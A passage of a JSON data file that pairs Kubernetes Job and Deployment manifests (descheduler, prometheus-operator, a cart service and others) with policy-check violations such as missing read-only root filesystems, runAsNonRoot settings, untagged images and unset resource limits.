    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job-complete-annotation-whitelist\n  namespace: test\nspec:\n  template:\n    metadata:\n      name: job-complete\n      annotations:\n        admission.validation.avast.com/readonly-rootfs-containers-whitelist: sleep\n    spec:\n      containers:\n      - name: sleep\n        image: tutum/curl\n        command:\n        - /bin/sleep\n        - 5m\n        resources:\n          requests:\n            cpu: 100m\n            memory: 5M\n          limits:\n            cpu: 200m\n            memory: 30M\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sleep\" is using an invalid container image, \"tutum/curl\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9888",
    "manifest_path": "data/manifests/the_stack_sample/sample_3798.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job-complete-annotation-whitelist\n  namespace: test\nspec:\n  template:\n    metadata:\n      name: job-complete\n      annotations:\n        admission.validation.avast.com/readonly-rootfs-containers-whitelist: sleep\n    spec:\n      containers:\n      - name: sleep\n        image: tutum/curl\n        command:\n        - /bin/sleep\n        - 5m\n        resources:\n          requests:\n            cpu: 100m\n            memory: 5M\n          limits:\n            cpu: 200m\n            memory: 30M\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sleep\" does not have a read-only root file system"
  },
  {
    "id": "9889",
    "manifest_path": "data/manifests/the_stack_sample/sample_3798.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job-complete-annotation-whitelist\n  namespace: test\nspec:\n  template:\n    metadata:\n      name: job-complete\n      annotations:\n        admission.validation.avast.com/readonly-rootfs-containers-whitelist: sleep\n    spec:\n      containers:\n      - name: sleep\n        image: tutum/curl\n        command:\n        - /bin/sleep\n        - 5m\n        resources:\n          requests:\n            cpu: 100m\n            memory: 5M\n          limits:\n            cpu: 200m\n            memory: 30M\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sleep\" is not set to runAsNonRoot"
  },
  {
    "id": "9890",
    "manifest_path": "data/manifests/the_stack_sample/sample_3799.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: employees\n  labels:\n    app: employees\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: employees\n  template:\n    metadata:\n      labels:\n        app: employees\n    spec:\n      containers:\n      - name: employees\n        image: nogada/employees\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1\n          requests:\n            cpu: 50m\n        livenessProbe:\n          httpGet:\n            path: /liveness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        volumeMounts:\n        - name: spring-properties\n          mountPath: /app/config\n      volumes:\n      - name: spring-properties\n        configMap:\n          name: config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"employees\" is using an invalid container image, \"nogada/employees\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9891",
    "manifest_path": "data/manifests/the_stack_sample/sample_3799.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: employees\n  labels:\n    app: employees\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: employees\n  template:\n    metadata:\n      labels:\n        app: employees\n    spec:\n      containers:\n      - name: employees\n        image: nogada/employees\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1\n          requests:\n            cpu: 50m\n        livenessProbe:\n          httpGet:\n            path: /liveness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        volumeMounts:\n        - name: spring-properties\n          mountPath: /app/config\n      volumes:\n      - name: spring-properties\n        configMap:\n          name: config\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"employees\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "9892",
    "manifest_path": "data/manifests/the_stack_sample/sample_3799.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: employees\n  labels:\n    app: employees\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: employees\n  template:\n    metadata:\n      labels:\n        app: employees\n    spec:\n      containers:\n      - name: employees\n        image: nogada/employees\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1\n          requests:\n            cpu: 50m\n        livenessProbe:\n          httpGet:\n            path: /liveness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        volumeMounts:\n        - name: spring-properties\n          mountPath: /app/config\n      volumes:\n      - name: spring-properties\n        configMap:\n          name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"employees\" does not have a read-only root file system"
  },
  {
    "id": "9893",
    "manifest_path": "data/manifests/the_stack_sample/sample_3799.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: employees\n  labels:\n    app: employees\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: employees\n  template:\n    metadata:\n      labels:\n        app: employees\n    spec:\n      containers:\n      - name: employees\n        image: nogada/employees\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1\n          requests:\n            cpu: 50m\n        livenessProbe:\n          httpGet:\n            path: /liveness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        volumeMounts:\n        - name: spring-properties\n          mountPath: /app/config\n      volumes:\n      - name: spring-properties\n        configMap:\n          name: config\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"employees\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "9894",
    "manifest_path": "data/manifests/the_stack_sample/sample_3799.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: employees\n  labels:\n    app: employees\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: employees\n  template:\n    metadata:\n      labels:\n        app: employees\n    spec:\n      containers:\n      - name: employees\n        image: nogada/employees\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1\n          requests:\n            cpu: 50m\n        livenessProbe:\n          httpGet:\n            path: /liveness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        volumeMounts:\n        - name: spring-properties\n          mountPath: /app/config\n      volumes:\n      - name: spring-properties\n        configMap:\n          name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"employees\" is not set to runAsNonRoot"
  },
  {
    "id": "9895",
    "manifest_path": "data/manifests/the_stack_sample/sample_3799.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: employees\n  labels:\n    app: employees\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: employees\n  template:\n    metadata:\n      labels:\n        app: employees\n    spec:\n      containers:\n      - name: employees\n        image: nogada/employees\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1\n          requests:\n            cpu: 50m\n        livenessProbe:\n          httpGet:\n            path: /liveness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 8080\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          timeoutSeconds: 1\n          successThreshold: 1\n        volumeMounts:\n        - name: spring-properties\n          mountPath: /app/config\n      volumes:\n      - name: spring-properties\n        configMap:\n          name: config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"employees\" has memory limit 0"
  },
  {
    "id": "9896",
    "manifest_path": "data/manifests/the_stack_sample/sample_3804.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations: {}\n  labels:\n    name: cartservice\n  name: cartservice\n  namespace: hipster-shop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cartservice\n  template:\n    metadata:\n      labels:\n        app: cartservice\n    spec:\n      containers:\n      - args: []\n        env:\n        - name: REDIS_ADDR\n          value: redis-cart-master:6379\n        - name: PORT\n          value: '7070'\n        - name: LISTEN_ADDR\n          value: 0.0.0.0\n        image: gcr.io/google-samples/microservices-demo/cartservice:v0.1.3\n        imagePullPolicy: Always\n        name: server\n        ports:\n        - containerPort: 7070\n          name: grpc\n        resources:\n          limits:\n            cpu: 300m\n            memory: 128Mi\n          requests:\n            cpu: 200m\n            memory: 64Mi\n        volumeMounts: []\n      volumes: []\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "9897",
    "manifest_path": "data/manifests/the_stack_sample/sample_3804.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations: {}\n  labels:\n    name: cartservice\n  name: cartservice\n  namespace: hipster-shop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cartservice\n  template:\n    metadata:\n      labels:\n        app: cartservice\n    spec:\n      containers:\n      - args: []\n        env:\n        - name: REDIS_ADDR\n          value: redis-cart-master:6379\n        - name: PORT\n          value: '7070'\n        - name: LISTEN_ADDR\n          value: 0.0.0.0\n        image: gcr.io/google-samples/microservices-demo/cartservice:v0.1.3\n        imagePullPolicy: Always\n        name: server\n        ports:\n        - containerPort: 7070\n          name: grpc\n        resources:\n          limits:\n            cpu: 300m\n            memory: 128Mi\n          requests:\n            cpu: 200m\n            memory: 64Mi\n        volumeMounts: []\n      volumes: []\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "9898",
    "manifest_path": "data/manifests/the_stack_sample/sample_3808.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: descheduler\n  namespace: kube-system\n  labels:\n    app: descheduler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: descheduler\n  template:\n    metadata:\n      labels:\n        name: descheduler\n    spec:\n      containers:\n      - name: descheduler\n        image: us.gcr.io/k8s-artifacts-prod/descheduler/descheduler:v0.21.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --evict-local-storage-pods\n        - ''\n        - --v\n        - '3'\n        - --descheduling-interval\n        - 1m\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"descheduler\" does not have a read-only root file system"
  },
  {
    "id": "9899",
    "manifest_path": "data/manifests/the_stack_sample/sample_3808.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: descheduler\n  namespace: kube-system\n  labels:\n    app: descheduler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: descheduler\n  template:\n    metadata:\n      labels:\n        name: descheduler\n    spec:\n      containers:\n      - name: descheduler\n        image: us.gcr.io/k8s-artifacts-prod/descheduler/descheduler:v0.21.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --evict-local-storage-pods\n        - ''\n        - --v\n        - '3'\n        - --descheduling-interval\n        - 1m\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"descheduler-sa\" not found"
  },
  {
    "id": "9900",
    "manifest_path": "data/manifests/the_stack_sample/sample_3808.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: descheduler\n  namespace: kube-system\n  labels:\n    app: descheduler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: descheduler\n  template:\n    metadata:\n      labels:\n        name: descheduler\n    spec:\n      containers:\n      - name: descheduler\n        image: us.gcr.io/k8s-artifacts-prod/descheduler/descheduler:v0.21.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --evict-local-storage-pods\n        - ''\n        - --v\n        - '3'\n        - --descheduling-interval\n        - 1m\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"descheduler\" is not set to runAsNonRoot"
  },
  {
    "id": "9901",
    "manifest_path": "data/manifests/the_stack_sample/sample_3808.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: descheduler\n  namespace: kube-system\n  labels:\n    app: descheduler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: descheduler\n  template:\n    metadata:\n      labels:\n        name: descheduler\n    spec:\n      containers:\n      - name: descheduler\n        image: us.gcr.io/k8s-artifacts-prod/descheduler/descheduler:v0.21.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --evict-local-storage-pods\n        - ''\n        - --v\n        - '3'\n        - --descheduling-interval\n        - 1m\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"descheduler\" has cpu request 0"
  },
  {
    "id": "9902",
    "manifest_path": "data/manifests/the_stack_sample/sample_3808.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: descheduler\n  namespace: kube-system\n  labels:\n    app: descheduler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: descheduler\n  template:\n    metadata:\n      labels:\n        name: descheduler\n    spec:\n      containers:\n      - name: descheduler\n        image: us.gcr.io/k8s-artifacts-prod/descheduler/descheduler:v0.21.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --evict-local-storage-pods\n        - ''\n        - --v\n        - '3'\n        - --descheduling-interval\n        - 1m\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"descheduler\" has memory limit 0"
  },
  {
    "id": "9903",
    "manifest_path": "data/manifests/the_stack_sample/sample_3810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-user-workload-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --deny-namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-user-workload-monitoring\n        - --alertmanager-instance-namespaces=openshift-user-workload-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-user-workload-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 1m\n            memory: 17Mi\n        securityContext: {}\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 10Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-user-workload-tls\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-user-workload-tls\n        secret:\n          secretName: prometheus-operator-user-workload-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy\" does not have a read-only root file system"
  },
  {
    "id": "9904",
    "manifest_path": "data/manifests/the_stack_sample/sample_3810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-user-workload-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --deny-namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-user-workload-monitoring\n        - --alertmanager-instance-namespaces=openshift-user-workload-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-user-workload-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 1m\n            memory: 17Mi\n        securityContext: {}\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 10Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-user-workload-tls\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-user-workload-tls\n        secret:\n          secretName: prometheus-operator-user-workload-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus-operator\" does not have a read-only root file system"
  },
  {
    "id": "9905",
    "manifest_path": "data/manifests/the_stack_sample/sample_3810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-user-workload-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --deny-namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-user-workload-monitoring\n        - --alertmanager-instance-namespaces=openshift-user-workload-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-user-workload-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 1m\n            memory: 17Mi\n        securityContext: {}\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 10Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-user-workload-tls\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-user-workload-tls\n        secret:\n          secretName: prometheus-operator-user-workload-tls\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prometheus-operator\" not found"
  },
  {
    "id": "9906",
    "manifest_path": "data/manifests/the_stack_sample/sample_3810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-user-workload-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --deny-namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-user-workload-monitoring\n        - --alertmanager-instance-namespaces=openshift-user-workload-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-user-workload-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 1m\n            memory: 17Mi\n        securityContext: {}\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 10Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-user-workload-tls\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-user-workload-tls\n        secret:\n          secretName: prometheus-operator-user-workload-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-rbac-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "9907",
    "manifest_path": "data/manifests/the_stack_sample/sample_3810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-user-workload-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --deny-namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-user-workload-monitoring\n        - --alertmanager-instance-namespaces=openshift-user-workload-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-user-workload-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 1m\n            memory: 17Mi\n        securityContext: {}\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 10Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-user-workload-tls\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-user-workload-tls\n        secret:\n          